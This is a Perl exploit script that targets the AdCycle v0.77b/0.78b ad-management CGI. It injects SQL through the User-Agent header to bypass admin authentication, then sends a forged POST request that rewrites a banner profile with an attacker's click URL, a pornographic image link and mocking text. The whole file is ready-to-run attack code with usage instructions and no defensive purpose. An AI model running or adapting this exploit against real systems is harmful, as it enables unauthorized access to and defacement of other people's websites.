#!/usr/bin/perl
#
#Adcycle v0.78b eXploit
#by neilk@alldas.de
#
#This script exploits a situation that allows a remote user to 'skip'
#authentication if the legitimate Admin is logged in or has not logged
#out properly since their last session.
#
#Shoutz to: tribunal, domz, all @alldas.de, mjm @gmc-online.de
#	    code segments borrowed from teleh0r @doglover.com
#
#http://news.alldas.de.
#

use strict;
use Socket;

banner();

if (@ARGV < 1) {
	usage();
	exit(1);
}

(my $target) = @ARGV;

my $clickurl="http://www.fuqu.com";
my $dir="cgi-bin/adcycle";
my $imageurl="http://www.hornylesbians.com/pr0n.gif";
my $cid="MT01";
my $bannerid=1;
my $agent = "Mozilla'||aid='ADMIN";

my $url = "click=$clickurl&image=$imageurl&pri=0&change=Update+Banner+1+Profile&option=AUTO&border=1&align=CENTER&target=_blank&alt=h0h0h0h0&btext=%3Cfont+face%3D%22verdana%22+size%3D2%3E%3Cstrong%3EClick+Here+to+Visit+our+Sponsor%3C%2Fstrong%3E%3C%2Ffont%3E&html=%3C%21--+START+ADCYCLE.COM+RICH+MEDIA+HTML+CODE+--%3E%0D%0A%3Ccenter%3E%0D%0A%3Ca+href%3D%22http%3A%2F%2F$target%2F$dir%2Fadclick.cgi%3Fmanager%3Dadcycle.com%26cid%3D$cid%26b%3D1%26id%3DIDNUMBER%22+target%3D%22_top%22%3E%0D%0A%3Cimg+src%3D%22$imageurl%22+width%3D468+height%3D60+border%3D1+ALT%3D%22Script+Kiddiot+Attack!%22%3E%3C%2Fa%3E%3Cbr%3E%0D%0A%3Ca+href%3D%22http%3A%2F%2F$target%2F$dir%2Fadclick.cgi%3Fmanager%3Dadcycle.com%26cid%3D$cid%26b%3D1%26id%3DIDNUMBER%22+target%3D%22_top%22%3E%3Cfont+face%3D%22verdana%22+size%3D2%3E%3Cstrong%3Eantionlinesuxhard%3C%2Fstrong%3E%3C%2Ffont%3E%3C%2Fa%3E%0D%0A%3C%2Fcenter%3E%0D%0A+%3C%21--+END+ADCYCLE.COM+RICH+MEDIA+HTML+CODE+--%3E%0D%0A%0D%0A&null=%3Ca+href%3D%22http%3A%2F%2F$target%2F$dir%2Fadclick.cgi%3Fmanager%3Dadcycle.com%26cid%3D$cid%26b%3D1%26id%3DIDNUMBER%22%3E&task=update_banner_profile&cid=$cid&banner=$bannerid&pg=2";

my $url_length = length($url);

my $request=
"POST /$dir/adcenter.cgi HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: $url_length

$url
";

my $iaddr = inet_aton($target);
my $paddr = sockaddr_in(80, $iaddr);
my $proto = getprotobyname('tcp');

socket(SOCKET, PF_INET, SOCK_STREAM, 'tcp');
connect(SOCKET, $paddr);
send(SOCKET,"$request", 0);
close(SOCKET);

exit(1);

sub banner {
	print "\nAdcycle eXploit for V0.77b/0.78b\n";
	print "by Neilk (neilk\@alldas.de/neil\@alldas.de)\n";
	print "http://www.alldas.de\n\n";
}

sub usage {
	print "Usage:\tperl $0 <target ip>\n\n";
}

